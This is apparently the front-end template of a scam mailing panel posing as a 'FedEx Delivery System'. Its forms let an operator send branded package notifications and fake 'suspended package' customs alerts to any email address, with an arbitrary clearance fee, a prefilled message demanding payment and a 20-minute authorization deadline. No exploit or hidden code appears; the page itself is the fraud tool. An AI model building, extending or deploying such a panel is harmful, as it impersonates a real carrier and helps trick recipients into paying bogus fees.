<!-- views/index.ejs -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FedEx Package Delivery System</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #4d148c, #6c63ff); min-height: 100vh; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; color: white; margin-bottom: 30px; }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; }
        .header p { font-size: 1.2em; opacity: 0.9; }
        .form-container { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
        .form-section { margin-bottom: 25px; }
        .form-section h3 { color: #4d148c; margin-bottom: 15px; font-size: 1.3em; border-bottom: 2px solid #eee; padding-bottom: 8px; }
        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .form-group { margin-bottom: 15px; }
        .form-group.full-width { grid-column: 1 / -1; }
        label { display: block; margin-bottom: 5px; font-weight: 600; color: #333; }
        input, textarea, select { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 14px; transition: border-color 0.3s; }
        input:focus, textarea:focus, select:focus { outline: none; border-color: #4d148c; }
        textarea { resize: vertical; min-height: 100px; }
        .file-input { position: relative; overflow: hidden; display: inline-block; width: 100%; }
        .file-input input[type=file] { position: absolute; left: -9999px; }
        .file-input-label { display: block; padding: 12px; border: 2px dashed #4d148c; border-radius: 8px; text-align: center; cursor: pointer; transition: all 0.3s; }
        .file-input-label:hover { background-color: #f8f9ff; }
        .file-preview { margin-top: 10px; text-align: center; }
        .file-preview img { max-width: 200px; border-radius: 8px; border: 2px solid #ddd; }
        .submit-btn { background: linear-gradient(45deg, #4d148c, #6c63ff); color: white; padding: 15px 40px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: transform 0.3s; }
        .submit-btn:hover { transform: translateY(-2px); }
        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .result-message { padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; }
        .success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .loading { display: none; text-align: center; margin-top: 20px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4d148c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .address-hint { font-size: 12px; color: #666; margin-top: 5px; font-style: italic; }
        .map-icon { color: #4d148c; margin-right: 5px; }
        .suspended-section { background: #fff3cd; padding: 25px; border-radius: 10px; border: 2px solid #ffeaa7; margin: 40px 0; }
        .suspended-header { color: #856404; text-align: center; margin-bottom: 20px; }
        .suspended-btn { background: linear-gradient(45deg, #dc3545, #ff6b6b); }
        .divider { margin: 40px 0; border: 1px solid #eee; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📦 FedEx Delivery System</h1>
            <p>Send package delivery notifications and suspended package alerts</p>
        </div>

        <div class="form-container">
            <!-- Regular Package Delivery Form -->
            <form id="taskForm" enctype="multipart/form-data">
                <!-- Recipient Details -->
                <div class="form-section">
                    <h3>👤 Recipient Information</h3>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="recipientEmail">Recipient Email *</label>
                            <input type="email" id="recipientEmail" name="recipientEmail" required>
                        </div>
                        <div class="form-group">
                            <label for="recipientName">Recipient Name *</label>
                            <input type="text" id="recipientName" name="recipientName" required>
                        </div>
                    </div>
                </div>

                <!-- Language Selection -->
                <div class="form-section">
                    <h3>🌐 Email Language</h3>
                    <div class="form-group">
                        <label for="emailLanguage">Language for Email Notification</label>
                        <select id="emailLanguage" name="emailLanguage">
                            <option value="en" selected>English</option>
                            <option value="pt-br">Português (Brasil)</option>
                            <option value="es">Español</option>
                        </select>
                        <div class="address-hint">💡 The form stays in English, but the email will be sent in the selected language</div>
                    </div>
                </div>

                <!-- Package Details -->
                <div class="form-section">
                    <h3>📋 Basic Details</h3>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="taskName">Package Name *</label>
                            <input type="text" id="taskName" name="taskName" placeholder="e.g., Electronic Device Package" required>
                        </div>
                        <div class="form-group">
                            <label for="specialId">Special ID (Optional)</label>
                            <input type="text" id="specialId" name="specialId" placeholder="Auto-generated if empty">
                        </div>
                        <div class="form-group">
                            <label for="priority">Priority</label>
                            <select id="priority" name="priority">
                                <option value="Low">Low Priority</option>
                                <option value="Standard" selected>Standard Priority</option>
                                <option value="High">High Priority</option>
                                <option value="Urgent">Urgent Priority</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label for="estimatedTime">Estimated Time to Finish</label>
                            <input type="text" id="estimatedTime" name="estimatedTime" placeholder="e.g., 2-3 days">
                        </div>
                    </div>
                </div>

                <!-- Package Image -->
                <div class="form-section">
                    <h3>🖼️ Package Image/Preview</h3>
                    <div class="form-group">
                        <div class="file-input">
                            <input type="file" id="taskImage" name="taskImage" accept="image/*">
                            <label for="taskImage" class="file-input-label">
                                📸 Click to upload package image (optional)
                            </label>
                        </div>
                        <div class="file-preview" id="imagePreview"></div>
                    </div>
                </div>

                <!-- Specifications -->
                <div class="form-section">
                    <h3>📊 Specifications</h3>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="weight">Weight</label>
                            <input type="text" id="weight" name="weight" placeholder="e.g., 2.5 kg">
                        </div>
                        <div class="form-group">
                            <label for="dimensions">Dimensions</label>
                            <input type="text" id="dimensions" name="dimensions" placeholder="e.g., 30x20x15 cm">
                        </div>
                        <div class="form-group">
                            <label for="value">Value</label>
                            <input type="text" id="value" name="value" placeholder="e.g., $150">
                        </div>
                    </div>
                    
                    <!-- Address Section with Map Support -->
                    <div class="form-grid" style="margin-top: 20px;">
                        <div class="form-group full-width">
                            <label for="address1">
                                <span class="map-icon">📍</span>Pickup Address
                            </label>
                            <input type="text" id="address1" name="address1" placeholder="e.g., 123 Main Street, New York, NY or Victoria Island, Lagos, Nigeria">
                            <div class="address-hint">💡 Enter a specific address, landmark, or location. Maps will be generated for the recipient!</div>
                        </div>
                    </div>
                    
                    <!-- Pickup Location Image -->
                    <div class="form-group" style="margin-top: 20px;">
                        <label>
                            <span class="map-icon">📸</span>Pickup Location Picture (Optional)
                        </label>
                        <div class="file-input">
                            <input type="file" id="pickupLocationImage" name="pickupLocationImage" accept="image/*">
                            <label for="pickupLocationImage" class="file-input-label">
                                📸 Click to upload pickup location picture
                            </label>
                        </div>
                        <div class="file-preview" id="pickupLocationPreview"></div>
                        <div class="address-hint">💡 Upload a picture of the pickup address/location for the recipient to see</div>
                    </div>
                </div>

                <button type="submit" class="submit-btn">📤 Send Package Notification</button>
            </form>

            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Sending notification...</p>
            </div>

            <div id="result"></div>

            <!-- Divider -->
            <div class="divider"></div>

            <!-- Suspended Package Form -->
            <div class="suspended-section">
                <div class="suspended-header">
                    <h3>🚨 Suspended Package Notification</h3>
                    <p>Send notifications for packages held at customs</p>
                </div>

                <form id="suspendedPackageForm" enctype="multipart/form-data">
                    <!-- Recipient Details -->
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="suspendedRecipientEmail">Recipient Email *</label>
                            <input type="email" id="suspendedRecipientEmail" name="recipientEmail" required>
                        </div>
                        <div class="form-group">
                            <label for="suspendedRecipientName">Recipient Name *</label>
                            <input type="text" id="suspendedRecipientName" name="recipientName" required>
                        </div>
                    </div>

                    <!-- Language Selection -->
                    <div class="form-section">
                        <h3>🌐 Email Language</h3>
                        <div class="form-group">
                            <label for="emailLanguage">Language for Email Notification</label>
                            <select id="emailLanguage" name="emailLanguage">
                                <option value="en" selected>English</option>
                                <option value="pt-br">Português (Brasil)</option>
                                <option value="es">Español</option>
                            </select>
                            <div class="address-hint">💡 The form stays in English, but the email will be sent in the selected language</div>
                        </div>
                    </div>

                    <!-- Package Details -->
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="packageName">Package Name *</label>
                            <input type="text" id="packageName" name="packageName" placeholder="e.g., Electronic Device Package" required>
                        </div>
                        <div class="form-group">
                            <label for="suspendedSpecialId">Special ID (Optional)</label>
                            <input type="text" id="suspendedSpecialId" name="specialId" placeholder="Auto-generated if empty">
                        </div>
                        <div class="form-group">
                            <label for="clearanceFee">Clearance Fee *</label>
                            <input type="text" id="clearanceFee" name="clearanceFee" placeholder="e.g., $150.00" required>
                        </div>
                        <div class="form-group">
                            <label for="distributionHub">Distribution Hub</label>
                            <input type="text" id="distributionHub" name="distributionHub" placeholder="e.g., Main Distribution Hub">
                        </div>
                    </div>

                    <!-- Customs Reason -->
                    <div class="form-group">
                        <label for="customsReason">Customs Reason *</label>
                        <select id="customsReason" name="customsReason" required>
                            <option value="Outstanding customs charge">Outstanding customs charge</option>
                            <option value="Documentation required">Documentation required</option>
                            <option value="Prohibited item review">Prohibited item review</option>
                            <option value="Tax payment required">Tax payment required</option>
                            <option value="Import license needed">Import license needed</option>
                        </select>
                    </div>

                    <!-- Package Image -->
                    <div class="form-group">
                        <label>Package Image (Optional)</label>
                        <div class="file-input">
                            <input type="file" id="suspendedPackageImage" name="packageImage" accept="image/*">
                            <label for="suspendedPackageImage" class="file-input-label">
                                📸 Click to upload package image
                            </label>
                        </div>
                        <div class="file-preview" id="suspendedImagePreview"></div>
                    </div>

                    <!-- Custom Message -->
                    <div class="form-group">
                        <label for="suspendedMessage">Custom Message</label>
                        <textarea id="suspendedMessage" name="contactMessage" placeholder="Enter custom message about the suspended package...">You need to pay the clearance fee before your package can be distributed. For more information contact our customer service.</textarea>
                    </div>

                    <button type="submit" class="submit-btn suspended-btn">🚨 Send Suspended Package Notification</button>
                </form>

                <div class="loading" id="suspendedLoading" style="display: none;">
                    <div class="spinner"></div>
                    <p>Sending suspended package notification...</p>
                </div>

                <div id="suspendedResult"></div>
            </div>
        </div>
    </div>

    <script>
        // Package image preview functionality
        document.getElementById('taskImage').addEventListener('change', function(e) {
            const file = e.target.files[0];
            const preview = document.getElementById('imagePreview');
            const label = document.querySelector('label[for="taskImage"]');
            
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.innerHTML = `<img src="${e.target.result}" alt="Preview">`;
                    label.textContent = `✅ ${file.name} selected`;
                };
                reader.readAsDataURL(file);
            } else {
                preview.innerHTML = '';
                label.textContent = '📸 Click to upload package image (optional)';
            }
        });

        // Pickup location image preview functionality
        document.getElementById('pickupLocationImage').addEventListener('change', function(e) {
            const file = e.target.files[0];
            const preview = document.getElementById('pickupLocationPreview');
            const label = document.querySelector('label[for="pickupLocationImage"]');
            
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.innerHTML = `<img src="${e.target.result}" alt="Pickup Location Preview">`;
                    label.textContent = `✅ ${file.name} selected`;
                };
                reader.readAsDataURL(file);
            } else {
                preview.innerHTML = '';
                label.textContent = '📸 Click to upload pickup location picture';
            }
        });

        // Form submission
        document.getElementById('taskForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const submitBtn = document.querySelector('.submit-btn');
            const loading = document.getElementById('loading');
            const result = document.getElementById('result');
            
            // Show loading
            submitBtn.disabled = true;
            loading.style.display = 'block';
            result.innerHTML = '';
            
            try {
                const response = await fetch('/send-task', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.success) {
                    result.innerHTML = `
                        <div class="result-message success">
                            <h3>✅ Package notification sent successfully!</h3>
                            <p><strong>Special ID:</strong> ${data.specialId}</p>
                            <p>Your friend will receive the notification with maps shortly and has 20 minutes to authorize it.</p>
                        </div>
                    `;
                    this.reset();
                    document.getElementById('imagePreview').innerHTML = '';
                    document.getElementById('pickupLocationPreview').innerHTML = '';
                    document.querySelector('label[for="taskImage"]').textContent = '📸 Click to upload package image (optional)';
                    document.querySelector('label[for="pickupLocationImage"]').textContent = '📸 Click to upload pickup location picture';
                } else {
                    result.innerHTML = `
                        <div class="result-message error">
                            <h3>❌ Failed to send notification</h3>
                            <p>${data.message}</p>
                        </div>
                    `;
                }
            } catch (error) {
                result.innerHTML = `
                    <div class="result-message error">
                        <h3>❌ Error occurred</h3>
                        <p>Please check your internet connection and try again.</p>
                    </div>
                `;
            } finally {
                submitBtn.disabled = false;
                loading.style.display = 'none';
            }
        });

        // Suspended Package Image Preview
        document.getElementById('suspendedPackageImage').addEventListener('change', function(e) {
            const file = e.target.files[0];
            const preview = document.getElementById('suspendedImagePreview');
            const label = document.querySelector('label[for="suspendedPackageImage"]');
            
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) {
                    preview.innerHTML = `<img src="${e.target.result}" alt="Preview">`;
                    label.textContent = `✅ ${file.name} selected`;
                };
                reader.readAsDataURL(file);
            } else {
                preview.innerHTML = '';
                label.textContent = '📸 Click to upload package image';
            }
        });

        // Suspended Package Form Submission
        document.getElementById('suspendedPackageForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const submitBtn = this.querySelector('.submit-btn');
            const loading = document.getElementById('suspendedLoading');
            const result = document.getElementById('suspendedResult');
            
            // Show loading
            submitBtn.disabled = true;
            loading.style.display = 'block';
            result.innerHTML = '';
            
            try {
                const response = await fetch('/send-suspended-package', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.success) {
                    result.innerHTML = `
                        <div class="result-message success">
                            <h3>✅ Suspended package notification sent successfully!</h3>
                            <p><strong>Special ID:</strong> ${data.specialId}</p>
                            <p>The recipient has been notified about the suspended package and clearance requirements.</p>
                        </div>
                    `;
                    this.reset();
                    document.getElementById('suspendedImagePreview').innerHTML = '';
                    document.querySelector('label[for="suspendedPackageImage"]').textContent = '📸 Click to upload package image';
                } else {
                    result.innerHTML = `
                        <div class="result-message error">
                            <h3>❌ Failed to send suspended package notification</h3>
                            <p>${data.message}</p>
                        </div>
                    `;
                }
            } catch (error) {
                result.innerHTML = `
                    <div class="result-message error">
                        <h3>❌ Error occurred</h3>
                        <p>Please check your internet connection and try again.</p>
                    </div>
                `;
            } finally {
                submitBtn.disabled = false;
                loading.style.display = 'none';
            }
        });
    </script>
</body>
</html>